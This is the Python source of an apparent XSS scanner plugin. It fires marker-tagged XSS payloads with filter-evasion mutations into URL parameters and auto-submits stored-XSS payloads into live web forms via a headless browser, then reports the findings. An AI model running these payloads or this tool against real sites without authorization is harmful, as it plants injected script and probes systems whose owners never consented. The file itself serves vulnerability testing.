"""
RedCortex Plugin: Ultra-Advanced XSS Detection and Fuzzing

Upgrades in this version:
- Async/concurrent fuzzing with asyncio + httpx, rate limiting, retries, jitter
- Coverage for reflected, stored, and DOM-based XSS using Playwright browser automation
- CSP header inspection and reporting
- Multi-encoding and evasion payload mutations (URL, HTML entity, base64, mixed-case, backticks, template literals, JS obfuscation)
- Heuristic sinks scanning for DOM XSS (document.write/innerHTML/outerHTML/insertAdjacentHTML/eval/new Function/setTimeout/location/href/src/inline handlers)
- Context-aware payloads (attr, JS, HTML, CSS, URL contexts) and auto-fallbacks
- Automated report generation endpoint with JSON and HTML output
- Strong comments for each major upgrade
"""

from __future__ import annotations
import asyncio
import base64
import contextlib
import dataclasses
import hashlib
import html
import json
import random
import re
import time
from typing import Any, Dict, List, Optional, Set, Tuple

import httpx

try:
    from playwright.async_api import async_playwright
except Exception:  # noqa: BLE001
    async_playwright = None

DEFAULT_TIMEOUT = 15.0
CONCURRENCY = 12
RATE_LIMIT_PER_SEC = 10
RETRY_ATTEMPTS = 2
RETRY_BACKOFF = (0.5, 1.5)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0)",
]

XSS_PARAMS = [
    "q", "search", "query", "term", "keyword",
    "page", "user", "name", "input", "message",
    "comment", "desc", "email", "id", "ref",
    "file", "txt", "news", "title", "url",
]

BASE_PAYLOADS = [
    "<script>alert(1)</script>",
    '"/><svg onload=alert(2)>',
    "<img src=x onerror=alert(3)>",
    "</title><script>alert(4)</script>",
    "<svg><script href=javascript:alert(5)></script>",
    "<iframe src=javascript:alert(6)>",
    "<a href=javascript:alert(7)>x</a>",
    "<svg onload=confirm(document.domain)>",
    "<details open ontoggle=alert(8)>",
    "<marquee onstart=alert(9)>",
    "${alert(10)}",
    "`-alert(11)-`",
]

TAMPERS = [
    lambda x: x,
    lambda x: x.replace("alert", "al" + "ert"),
    lambda x: x.replace("<", "%3c").replace(">", "%3e"),
    lambda x: html.escape(x),
    lambda x: ''.join(f"%{c.encode().hex()}" if c in '<>"\' ' else c for c in x),
    lambda x: ''.join(random.choice([c.lower(), c.upper()]) for c in x),
    lambda x: f"data:text/html;base64,{base64.b64encode(x.encode()).decode()}",
    lambda x: x.replace("s", "\\x73").replace("c", "\\x63"),
]

DOM_SINKS = re.compile(
    r"(document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval\(|Function\(|setTimeout\(|location\.|src\s*=|href\s*=|on[a-z]+\s*=)",
    re.I,
)

@dataclasses.dataclass
class Finding:
    target: str
    vector: str  # reflected, stored, dom
    param: Optional[str]
    payload: str
    context: str  # html, attr, js, url, css
    evidence: str
    csp: Optional[Dict[str, Any]] = None


class RateLimiter:
    def __init__(self, rate_per_sec: int):
        self.rate = rate_per_sec
        self.tokens = rate_per_sec
        self.updated = time.monotonic()
        self.lock = asyncio.Lock()

    async def acquire(self) -> None:
        async with self.lock:
            now = time.monotonic()
            elapsed = now - self.updated
            refill = int(elapsed * self.rate)
            if refill:
                self.tokens = min(self.rate, self.tokens + refill)
                self.updated = now
            while self.tokens <= 0:
                await asyncio.sleep(1 / self.rate)
                now = time.monotonic()
                elapsed = now - self.updated
                refill = int(elapsed * self.rate)
                if refill:
                    self.tokens = min(self.rate, self.tokens + refill)
                    self.updated = now
            self.tokens -= 1


def rand_marker(n: int = 8) -> str:
    import string as _s
    return ''.join(random.choice(_s.ascii_letters + _s.digits) for _ in range(n))


def merge_url_params(url: str, key: str, value: str) -> str:
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    sp = urlsplit(url)
    q = dict(parse_qsl(sp.query, keep_blank_values=True))
    q[key] = value
    return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(q, doseq=True), sp.fragment))


def parse_csp(header: Optional[str]) -> Optional[Dict[str, Any]]:
    if not header:
        return None
    parts: Dict[str, Any] = {}
    for d in header.split(';'):
        d = d.strip()
        if not d:
            continue
        k, _, v = d.partition(' ')
        parts[k.lower()] = v.strip()
    return parts or None


def build_payloads(marker: str) -> List[Tuple[str, str]]:
    """Major upgrade: context-aware payloads with marker + evasion mutations."""
    payloads: List[Tuple[str, str]] = []

    def inject_marker(p: str) -> str:
        return p.replace('alert(', f"alert('{marker}',") \
                 .replace('confirm(', f"confirm('{marker}',") \
                 .replace('prompt(', f"prompt('{marker}',")

    corpus = [inject_marker(p) for p in BASE_PAYLOADS]
    contexts = {
        'html': [f"<img src=x onerror=alert('{marker}')>", f"<svg onload=alert('{marker}')>"],
        'attr': [f'" onmouseover=alert("{marker}") x="', f"' autofocus onfocus=alert('{marker}') "],
        'js':   [f"');alert('{marker}');//", f"`);alert('{marker}');//"],
        'url':  [f"javascript:alert('{marker}')", f"//x/%3Cscript%3Ealert('{marker}')%3C/script%3E"],
        'css':  [f"</style><img src=x onerror=alert('{marker}')>", f"*|*:not(#a){{color:red/*{marker}*/}}"],
    }

    for ctx, examples in contexts.items():
        for e in examples:
            for t in TAMPERS:
                with contextlib.suppress(Exception):
                    payloads.append((t(e), ctx))

    for p in corpus:
        for t in TAMPERS:
            with contextlib.suppress(Exception):
                payloads.append((t(p), 'html'))

    dedup: Set[str] = set()
    uniq: List[Tuple[str, str]] = []
    for p, c in payloads:
        h = hashlib.sha1((p + c).encode()).hexdigest()
        if h not in dedup:
            dedup.add(h)
            uniq.append((p, c))
    return uniq


async def fetch_with_retries(client: httpx.AsyncClient, req: httpx.Request, attempts: int = RETRY_ATTEMPTS) -> httpx.Response:
    last_exc: Optional[Exception] = None
    for _ in range(attempts + 1):
        try:
            return await client.send(req, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
        except Exception as e:  # noqa: BLE001
            last_exc = e
            await asyncio.sleep(random.uniform(*RETRY_BACKOFF))
    assert last_exc
    raise last_exc


async def fuzz_endpoint(url: str, base_headers: Optional[Dict[str, str]] = None, params: Optional[List[str]] = None) -> Tuple[List[Finding], Optional[Dict[str, Any]]]:
    """Major upgrade: concurrent param+payload fuzzing and CSP capture."""
    limiter = RateLimiter(RATE_LIMIT_PER_SEC)
    findings: List[Finding] = []
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    if base_headers:
        headers.update(base_headers)

    marker = rand_marker()
    payloads = build_payloads(marker)
    params = params or XSS_PARAMS

    async with httpx.AsyncClient(http2=True, headers=headers, verify=False) as client:
        try:
            r0 = await client.get(url, timeout=DEFAULT_TIMEOUT)
            csp = parse_csp(r0.headers.get('content-security-policy'))
        except Exception:
            csp = None

        sem = asyncio.Semaphore(CONCURRENCY)

        async def task(param: str, payload: str, context: str) -> None:
            await limiter.acquire()
            async with sem:
                target = merge_url_params(url, param, payload)
                req = client.build_request('GET', target)
                with contextlib.suppress(Exception):
                    resp = await fetch_with_retries(client, req)
                    body = resp.text or ''
                    if marker in body or re.search(re.escape(payload), body or '', re.I):
                        evidence = ("Reflected with DOM sinks present for " + param) if DOM_SINKS.search(body) else ("Reflected content contains marker for " + param)
                        findings.append(Finding(target=target, vector='reflected', param=param, payload=payload, context=context, evidence=evidence, csp=csp))

        await asyncio.gather(*[task(p, pay, ctx) for p in params for pay, ctx in payloads], return_exceptions=True)
        return findings, csp


async def browser_probe(urls: List[str], headless: bool = True) -> List[Finding]:
    """Major upgrade: DOM/stored XSS runtime detection using Playwright."""
    if async_playwright is None:
        return []

    findings: List[Finding] = []

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=headless)
        context = await browser.new_context(ignore_https_errors=True, user_agent=random.choice(USER_AGENTS))

        async def inspect(u: str) -> None:
            page = await context.new_page()
            marker = rand_marker()
            observed: Dict[str, Any] = {"console": [], "requests": []}
            page.on("console", lambda m: observed["console"].append(m.text()))
            page.on("request", lambda r: observed["requests"].append(r.url))

            probe_js = f"""
                (function() {{
                  const M = '{marker}';
                  const oldWrite = document.write; document.write = function(x) {{ console.log('DOMSINK:write:'+x); return oldWrite.apply(this, arguments); }};
                  const dp = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
                  if (dp && dp.set) {{
                    Object.defineProperty(Element.prototype, 'innerHTML', {{ set(v) {{ console.log('DOMSINK:innerHTML:'+v); return dp.set.call(this, v); }}, get: dp.get }});
                  }}
                  window.addEventListener('error', e => console.log('ERROR:'+e.message));
                  console.log('PROBE_READY:'+M);
                }})()
            """

            await page.goto(u, wait_until="domcontentloaded")
            with contextlib.suppress(Exception):
                await page.add_script_tag(content=probe_js)

            forms = await page.query_selector_all('form')
            for f in forms[:5]:
                try:
                    inputs = await f.query_selector_all('input,textarea')
                    if not inputs:
                        continue
                    pmarker = rand_marker()
                    payload = f"<img src=x onerror=alert('{pmarker}')>"
                    for inp in inputs:
                        itype = (await inp.get_attribute('type')) or 'text'
                        if itype in ('hidden', 'submit', 'button', 'file'):
                            continue
                        with contextlib.suppress(Exception):
                            await inp.fill(payload)
                    with contextlib.suppress(Exception):
                        await f.evaluate('(el)=>el.submit()')
                    await page.wait_for_timeout(1200)
                    await page.reload(wait_until='domcontentloaded')
                    if any(pmarker in c for c in observed['console']):
                        findings.append(Finding(target=u, vector='stored', param=None, payload=payload, context='html', evidence='Payload executed via console log'))
                except Exception:
                    continue

            if any('DOMSINK' in c for c in observed['console']):
                findings.append(Finding(target=u, vector='dom', param=None, payload='probe', context='html', evidence='DOM sink activity observed'))

            await page.close()

        await asyncio.gather(*(inspect(u) for u in urls))
        await context.close()
        await browser.close()
    return findings


async def scan(targets: List[str], headers: Optional[Dict[str, str]] = None, params: Optional[List[str]] = None, headless: bool = True) -> Dict[str, Any]:
    """Orchestrates async fuzzing, browser probes, and reporting."""
    all_findings: List[Finding] = []
    csp_map: Dict[str, Dict[str, Any]] = {}

    results = await asyncio.gather(*(fuzz_endpoint(u, headers, params) for u in targets), return_exceptions=True)
    browser_findings: List[Finding] = []
    for (res, target) in zip(results, targets):
        if isinstance(res, Exception):
            continue
        findings, csp = res
        all_findings.extend(findings)
        if csp:
            csp_map[target] = csp
    # Run browser probe against all target URLs and any reflected URLs found
    reflected_urls = [f.target for f in all_findings if f.vector == 'reflected']
    browser_targets = list(set(targets + reflected_urls))
    browser_findings = await browser_probe(browser_targets, headless=headless)
    all_findings.extend(browser_findings)

    # Build report
    report = {
        "summary": {
            "targets": targets,
            "counts": {
                "reflected": sum(1 for f in all_findings if f.vector == 'reflected'),
                "stored": sum(1 for f in all_findings if f.vector == 'stored'),
                "dom": sum(1 for f in all_findings if f.vector == 'dom'),
            },
        },
        "csp": csp_map,
        "findings": [dataclasses.asdict(f) for f in all_findings],
    }
    return report


# Simple endpoint-like API to generate JSON or HTML reports from a scan result
async def generate_report(result: Dict[str, Any], fmt: str = "json") -> str:
    """Automated report generation endpoint.
    fmt: 'json' | 'html'
    """
    if fmt == 'json':
        return json.dumps(result, indent=2)
    # Basic HTML rendering
    parts = [
        "<html><head><meta charset='utf-8'><title>XSS Report</title>",
        "<style>body{font-family:system-ui} .sev{padding:8px;}</style></head><body>",
        f"<h1>XSS Scan Report</h1>",
        f"<h2>Targets: {', '.join(result.get('summary', {}).get('targets', []))}</h2>",
        "<h3>Summary</h3>",
        "<ul>",
        f"<li>Reflected: {result.get('summary', {}).get('counts', {}).get('reflected', 0)}</li>",
        f"<li>Stored: {result.get('summary', {}).get('counts', {}).get('stored', 0)}</li>",
        f"<li>DOM: {result.get('summary', {}).get('counts', {}).get('dom', 0)}</li>",
        "</ul>",
        "<h3>Detailed Findings</h3>",
        "<table border='1' cellspacing='0' cellpadding='5'>",
        "<thead><tr><th>Target</th><th>Vector</th><th>Parameter</th><th>Payload</th><th>Context</th><th>Evidence</th></tr></thead>",
        "<tbody>",
    ]
    for f in result.get("findings", []):
        parts.append(
            f"<tr><td>{html.escape(f['target'])}</td><td>{html.escape(f['vector'])}</td>"
            f"<td>{html.escape(str(f['param']) if f['param'] else '')}</td>"
            f"<td>{html.escape(f['payload'])}</td><td>{html.escape(f['context'])}</td>"
            f"<td>{html.escape(f['evidence'])}</td></tr>"
        )
    parts.append("</tbody></table></body></html>")
    return ''.join(parts)
